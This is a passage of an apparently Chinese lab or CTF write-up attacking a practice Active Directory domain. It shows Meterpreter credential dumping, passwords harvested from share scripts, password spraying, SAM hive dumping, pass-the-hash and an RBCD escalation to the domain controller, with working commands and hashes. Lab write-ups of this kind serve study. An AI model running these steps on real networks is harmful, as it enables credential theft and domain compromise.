&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfconsole
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">use exploit/multi/handler
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> payload windows/x64/meterpreter/bind_tcp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> rhost 172.16.36.21
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">run
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 提权&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">getsystem
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">getuid
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 获得NTHash&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">load kiwi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">creds_all
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">hashdump
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/10.png"
width="979"
height="568"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/10_hu_cebc3f1a5291126.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/10_hu_fad50a89410b7c7d.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="172"
data-flex-basis="413px"
>&lt;/p>
&lt;p>wmi没连接上，直接用msf里面的shell功能&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:d41d2c4614bf18fa34726d4c1ba69fc2:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\d&lt;/span>esktop&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>&lt;span class="nb">type&lt;/span> flag.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag3">flag3
&lt;/h2>&lt;p>看看登录会话或者注册表&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">query user
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg query &lt;span class="s2">&amp;#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 或者直接用msf里面的模块&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">run post/windows/gather/credentials/windows_autologin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/11.png"
width="1033"
height="737"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/11_hu_828bfae52c15692b.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/11_hu_9b2187f3224fcb5c.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="140"
data-flex-basis="336px"
>&lt;/p>
&lt;p>发现自动登录用户&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb 172.16.34.23 -u EthanMorris -p &lt;span class="s1">&amp;#39;DROCV4?LtyCp&amp;#39;&lt;/span> --shares
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nxc smb 172.16.34.5 -u EthanMorris -p &lt;span class="s1">&amp;#39;DROCV4?LtyCp&amp;#39;&lt;/span> --shares
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/12.png"
width="1421"
height="399"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/12_hu_25c417f852e28ca1.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/12_hu_3d7ecd75bfc77169.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="356"
data-flex-basis="854px"
>&lt;/p>
&lt;p>发现对&lt;strong>Aoselu FileService&lt;/strong>有读写权限，并且是域用户，收集域内信息&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodhound-python -u EthanMorris -p &lt;span class="s1">&amp;#39;DROCV4?LtyCp&amp;#39;&lt;/span> -d aoseluauto.com -ns 172.16.34.5 -c all --auth-method ntlm --dns-tcp --zip
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>用smbclient链接下&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-smbclient aoseluauto.com/EthanMorris:&lt;span class="s1">&amp;#39;DROCV4?LtyCp&amp;#39;&lt;/span>@172.16.34.23
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shares
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">use FileService
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> IT Resources
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> Ops Scripts
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>找到很多ps1文件&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/13.png"
width="822"
height="778"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/13_hu_346daa2ea8b8a24f.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/13_hu_f69a7b3b897bd37a.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="105"
data-flex-basis="253px"
>&lt;/p>
&lt;p>下载下来&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">lcd /tmp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">recurse ON
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">prompt OFF
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mget *.ps1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>里面有很多域用户和他们的密码，整理如下&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$username&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;aoseluauto\svc_bakadm01&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$password&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;k3!8Fa&amp;amp;Sq8Z6&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$remoteUser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;aoseluauto\\svc_netadm03&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$remotePass&lt;/span> &lt;span class="o">=&lt;/span> ConvertTo-SecureString &lt;span class="s2">&amp;#34;0&amp;amp;8SwSc=Ok%2&amp;#34;&lt;/span> -AsPlainText -Force
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$backupUser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;aoseluauto\\svc_bakadm02&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$backupPassPlain&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;CYNpR5i@Z?_=&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$backupUser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;aoseluauto\\svc_webadm02&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$backupPass&lt;/span> &lt;span class="o">=&lt;/span> ConvertTo-SecureString &lt;span class="s2">&amp;#34;WebAdmPass789!&amp;#34;&lt;/span> -AsPlainText -Force
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$remoteUser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;aoseluauto\\svc_netadm03&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$remotePass&lt;/span> &lt;span class="o">=&lt;/span> ConvertTo-SecureString &lt;span class="s2">&amp;#34;0&amp;amp;8SwSc=Ok%2&amp;#34;&lt;/span> -AsPlainText -Force
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$domainAdminUser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;aoseluauto\\svc_adm01&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$domainAdminPassword&lt;/span> &lt;span class="o">=&lt;/span> ConvertTo-SecureString &lt;span class="s2">&amp;#34;_7zg9QFlCTns&amp;#34;&lt;/span> -AsPlainText -Force
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>喷洒攻击&lt;strong>AOSELUAUTO\ASLSRVFS02&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">netexec smb 172.16.34.23 -u users.txt -p passwords.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">netexec rdp 172.16.34.23 -u users.txt -p passwords.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>只有&lt;code>svc_bakadm01\k3!8Fa&amp;amp;Sq8Z6&lt;/code>可以用，&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">evil-winrm -i 172.16.34.23 -u svc_bakadm01 -p &lt;span class="s1">&amp;#39;k3!8Fa&amp;amp;Sq8Z6&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami /priv
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/14.png"
width="683"
height="300"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/14_hu_33a70c8076f72746.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/14_hu_6189bc7bb20924cb.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="227"
data-flex-basis="546px"
>&lt;/p>
&lt;p>&lt;strong>SeBackupPrivilege&lt;/strong>权限，因为这里可不是DC嗷，不能卷影拷贝攻击，但是可以转储注册表&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">mkdir C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\s&lt;/span>vc_bakadm01&lt;span class="se">\D&lt;/span>ocuments&lt;span class="se">\d&lt;/span>ump
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg save HKLM&lt;span class="se">\S&lt;/span>AM C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\s&lt;/span>vc_bakadm01&lt;span class="se">\D&lt;/span>ocuments&lt;span class="se">\d&lt;/span>ump&lt;span class="se">\S&lt;/span>AM.hive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">reg save HKLM&lt;span class="se">\S&lt;/span>YSTEM C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\s&lt;/span>vc_bakadm01&lt;span class="se">\D&lt;/span>ocuments&lt;span class="se">\d&lt;/span>ump&lt;span class="se">\S&lt;/span>YSTEM.hive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dir C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\s&lt;/span>vc_bakadm01&lt;span class="se">\D&lt;/span>ocuments&lt;span class="se">\d&lt;/span>ump
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> dump
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">download SAM.hive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">download SYSTEM.hive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>SECURITY 权限不够emm，但是就用system和sam也可以得到管理员的&lt;code>NThash&lt;/code>了&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/15.png"
width="1073"
height="263"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/15_hu_55b07e6c95581958.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/15_hu_242f76261305d27d.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="407"
data-flex-basis="979px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:74aaf464e1a7a75f2123ada1dd62edab:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">netexec smb 172.16.34.23 -u Administrator -H 74aaf464e1a7a75f2123ada1dd62edab --local-auth -x &lt;span class="s2">&amp;#34;whoami&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">netexec smb 172.16.34.23 -u Administrator -H 74aaf464e1a7a75f2123ada1dd62edab --local-auth -x &lt;span class="s2">&amp;#34;cd C:\Users\Administrator\desktop\ &amp;amp;&amp;amp; dir&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">netexec smb 172.16.34.23 -u Administrator -H 74aaf464e1a7a75f2123ada1dd62edab --local-auth -x &lt;span class="s2">&amp;#34;type C:\Users\Administrator\desktop\flag.txt.txt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>拿到flag3之后，试试用这个hash进行本地转储&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nxc smb 172.16.34.23 -u Administrator -H 74aaf464e1a7a75f2123ada1dd62edab --local-auth -M lsassy
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>成功得到新的用户&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">aoseluauto.com\svc_monadm01
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">96Mr!je39y_p
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ab232c3cf9f4b7cf27602082b04f306b
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag4">flag4
&lt;/h2>&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/16.png"
width="578"
height="646"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/16_hu_5c322d8b0d998fb2.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-aoselu/16_hu_1ee969b06343f234.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="89"
data-flex-basis="214px"
>&lt;/p>
&lt;p>这个用户对域控有WriteDacl权限，可以打RBCD，先添加用户给这个主机完全控制权限&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-dacledit -action &lt;span class="s1">&amp;#39;write&amp;#39;&lt;/span> -rights &lt;span class="s1">&amp;#39;FullControl&amp;#39;&lt;/span> -principal &lt;span class="s1">&amp;#39;svc_monadm01&amp;#39;&lt;/span> -target-dn &lt;span class="s1">&amp;#39;CN=ASLSRVAD05,OU=Domain Controllers,DC=aoseluauto,DC=com&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;aoseluauto.com/svc_monadm01&amp;#39;&lt;/span> -hashes :ab232c3cf9f4b7cf27602082b04f306b -dc-ip 172.16.34.5
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>再者就是正常流程了&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-addcomputer &lt;span class="s1">&amp;#39;aoseluauto.com/svc_monadm01&amp;#39;&lt;/span> -hashes :ab232c3cf9f4b7cf27602082b04f306b -dc-ip 172.16.34.5 -computer-name &lt;span class="s1">&amp;#39;TEST6$&amp;#39;&lt;/span> -computer-pass &lt;span class="s1">&amp;#39;P@ssw0rd&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">impacket-rbcd &lt;span class="s1">&amp;#39;aoseluauto.com/svc_monadm01&amp;#39;&lt;/span> -hashes :ab232c3cf9f4b7cf27602082b04f306b -dc-ip 172.16.34.5 -action write -delegate-to &lt;span class="s1">&amp;#39;ASLSRVAD05$&amp;#39;&lt;/span> -delegate-from &lt;span class="s1">&amp;#39;TEST6$&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">impacket-getST aoseluauto.com/&lt;span class="s1">&amp;#39;TEST6$&amp;#39;&lt;/span>:&lt;span class="s1">&amp;#39;P@ssw0rd&amp;#39;&lt;/span> -spn cifs/ASLSRVAD05.aoseluauto.com -impersonate Administrator -dc-ip 172.16.34.5
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>失败了报错为&lt;code>KRB_AP_ERR_SKEW(Clock skew too great)&lt;/code>，和域控同步时间即可&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo apt install ntpsec-ntpdate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo ntpdate 172.16.34.5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
